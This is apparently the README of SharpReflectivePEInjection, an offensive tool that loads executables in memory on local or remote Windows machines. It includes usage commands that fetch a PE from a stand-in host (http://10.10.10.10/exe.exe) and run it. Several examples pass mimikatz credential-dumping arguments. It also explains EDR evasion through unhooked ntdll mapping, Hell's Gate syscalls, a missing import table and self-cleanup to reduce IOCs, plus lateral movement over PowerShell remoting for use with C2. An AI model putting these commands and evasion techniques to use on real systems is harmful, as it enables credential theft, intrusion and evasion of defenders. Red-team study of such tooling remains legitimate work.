# SharpReflectivePEInjection #

**Update: fixed x32 loading issue and till now syscalls are not working with x32 applications**

thanks to <a href=https://github.com/MexHigh>MexHigh</a> for telling me about this bug way back in november

```
C:\> SharpReflectivePEInjection.exe -h

-url, -u          url to the binary to download

-file, -f         full path to a binary to execute [useful when executing local PE on a remote machine]

-b64PE            pass the entire PE as B64 encoded blob (if you are a mad person)

-Args, -args, -a  Arguments to be passed to Exe [Optional]

-patch_exit       Patch CorExit and ExitProcess to ExitThread [you know what is it if you need it XD]

-syscalls         Instead of Mapping ntdll, will use dynamic syscalls [Hell's Gate Technique]

-ComputerName     use powershell remoting to execute the PE on a target machine [Optional] (Retrieves output)

-DisableForceExit Disable the 1.5 Minute Maximum Runtime Enforcement [Ex: if running interactive mimikatz]

-help             Display this help screen.


usage: .\SharpReflectivePEInjection.exe -url http://10.10.10.10/exe.exe [Optional: -Args "<EXE_ARGS>"]
usage: .\SharpReflectivePEInjection.exe -b64PE <BASE64 PE_BLOB> [Optional: -Args "<EXE_ARGS>"]
usage: .\SharpReflectivePEInjection.exe -url http://10.10.10.10/exe.exe -ComputerName server.ad.local [Optional: -Args "<EXE_ARGS>"]
```


## Local Execution ##

- SharpReflectivePEInjection supports multiple ways to load and execute a PE on the local machine 
	
	- from a server: `.\SharpReflectivePEInjection.exe -u http://10.10.10.10/exe.exe [Optional: -Args "sekurlsa::ekeys exit"]`
	- from a file: `.\SharpReflectivePEInjection.exe -f c:\windows\system32\net.exe [Optional: -Args "user"] [Optional: -patch_exit]`
	- from a base64 blob: `.\SharpReflectivePEInjection.exe -b64PE BASE_64_BLOB [Optional: -Args "sekurlsa::ekeys exit"]`


## Remote Execution ##

- SharpReflectivePEInjection supports multiple ways to load and execute a PE on a remote machine (retreives PE output from remote machine) 

	- from a server: `.\SharpReflectivePEInjection.exe -u http://10.10.10.10/exe.exe [Optional: -Args "sekurlsa::ekeys exit"] -ComputerName server.local`
	- from a file: `.\SharpReflectivePEInjection.exe -f c:\windows\system32\net.exe [Optional: -Args "user"] [Optional: -patch_exit] -ComputerName server.local`
	- from a base64 blob: `.\SharpReflectivePEInjection.exe -b64PE BASE_64_BLOB [Optional: -Args "sekurlsa::ekeys exit"] -ComputerName server.local`



## passing arguments to PE ##

- SharpReflectivePEInjection passes arguments to PE by patching 4 functions with the arguments provided through the (`-Args`) argument, those functions are:
	
	- `GetCommandLineW` - from kernelbase.dll
	- `GetCommandLineA` - from kernelbase.dll
	- `_wcmdln` - from msvcrt.dll
	- `_acmdln` - from msvcrt.dll

- this way of patching arguments effectively makes it compatible with any argument parsing method wether thats WindowsAPI or a basic `argv[]` method



## supported architectures ##

- SharpReflectivePEInjection supports both x86 and x64 architectures, if you compiled the tool for x86 you will be able to load x86 vice-versa for x64


## Windows API hooking & IAT  ##

- SharpReflectivePEInjection heavily depends on DInvoke in importations for a good reason, the way its designed is that it heavily relies on `ntdll.dll` API calls and by default maps a clean version of ntdll in the begining of its execution and uses delegates to map actual function pointers from the clean ntdll to the defined delegates so the delegates can be used as functions, because ntdll is at the last point of user-land this ensures any function call will be unhooked, another perk of this is that the binary does NOT have any IAT table as every importation happens dynamically



### kernel-land calls ###

- SharpReflectivePEInjection supports another way of using delegates and DInvoke to execute code, which is dynamic syscall invokation using the `GetSyscallStub()` function from DInvoke its able to read ntdll from disk extract the kernel syscall stub for the function we need and using Marshal we cast the syscall to a delegate and using this delegate we interface directly with kernel land when calling a function bypassing user-land entirely, this is known as (Hell's Gate Technique), this method is used when passing `-syscalls` argument




## Remote Reflection ##

- the Remote reflection capability utilizes multiple techniques to be able to remotely execute and remotely retrieve output from the PE:
	
	- what happens locally
		- uses the current user context to create a remote powershell runspace on the remote machine
		- the code has an embedded powershell dotNET loader stored in `powershell_script` variable
		- retrieves its own bytes Base64 encodes them and passes them to the dotnet loader
		- uses whatever method the user chose to retrieve the PE (url/file/b64) and always passes the PE to the dotNet loader in Base64 
		- takes the passed arguments, properly filters them and passes them to the dotnet loader 
		- forks 2 threads each thread opens a NamedPipe client that connects to (`stdout/stderr`) pipes remotely using the machine name passed to `-ComputerName` waiting to read from PE output from them
		- invokes the powershell dotnet loader in the remote runspace


	- what happens remotely
		- once the powershell code invoked in the remote runspace it starts to reflectively load and execute the dotNet bytes retreived first
		- after loading itself it starts loading the PE passed to it
		- after normally executing and before the PE entry point is called, it creates 2 named pipe servers and redirects its own stdout and stderr to them after this it calls a function named `Suicide` (discussed later)
		- once the loaded PE executed its output is passed to the named pipes which the clients from above reads



	- PE passing functionality
		- as mentioned above the PE which will be reflectively loaded on the remote machine is always passed to the remote machine in Base64, why

		- there is 2 good reasons behind this:
			- bypassing network based restrictions (ex: target machine can't reach the payload server to download the PE)
			- easily passing a local PE to a remote machine using the (-file) argument



- the idea behind the is that we can make the C# code execute itself on another machine and make only certain aspects of the code run under dynamically defined (true/false) conditions




## Suicide (the functions XD) and IOCs ##

- there are 2 functions in the code named (Suicide and LocalSuicide) *sorry for the disturbing name XD*

	- Suicide is called in seperate thread directly after stdout/err redirection when the program is running remotely, it waits for 15 seconds before automatically dispose all resources and make the process kills itself, the reason behind this is that if a problem happened during remote execution and the Execution didn't end properly, resources including created NamedPipes and Remote Runspaces are not disposed properly which causes 2 things, leaves IOCs on the remote machine prevents further remote reflections due to confusion in NamedPipe Communications this ensures that everytime a remote execution occurs after 15 seconds of Invoking the PE, it will close itself automatically despite any problems that may cause hanging, so we don't have to worry about cleaning up


	- LocalSuicide is pretty much the same thing but for local execution

		- the reason behind it is to ensure reliable use with C2 channels if the PE did not exit properly in a cmd session we can press CTRL-C and thats it but with C2 due to beaconing and multithreaded executions its not that simple, this ensures even if the PE errored and did not exit, that after 1.5 Mins it effectively will. the time the function waits before killing the process is 1.5 Mins, way longer than Suicide() to not interfere with actual execution

		- unlike Suicide, LocalSuicide can be disabled from the command line by using the `-DisableForceExit` flag


----------------------------------------------------------------------------------------

- I made this project for 2 reasons
	- understand more about PEs, windows internals and how to interact with them 
	- wanted a tool that does this


- these are resources and references i used during building this project:

	- https://github.com/nettitude/RunPE
	- https://labs.nettitude.com/whitepapers/NETT_RED_TEAM_PROCESS_HIVING_2021.pdf
	- https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
	- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/
	- https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/pe-file-header-parser-in-c++#output-screenshots
	- https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations
	- https://learn.microsoft.com/en-us/windows/win32/debug/pe-format
	- https://www.youtube.com/watch?si=_aOPmyksf-eMu5R7&v=oe11Q-3Akuk&feature=youtu.be
	- https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/pe-file-header-parser-in-c++#output-screenshots
	- https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/
	- https://github.com/klezVirus/CheeseTools
	- https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementPSRemoting/
	- https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
	- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly
	- https://0xrick.github.io/win-internals/pe1/ (part 1 to 7)
	

	
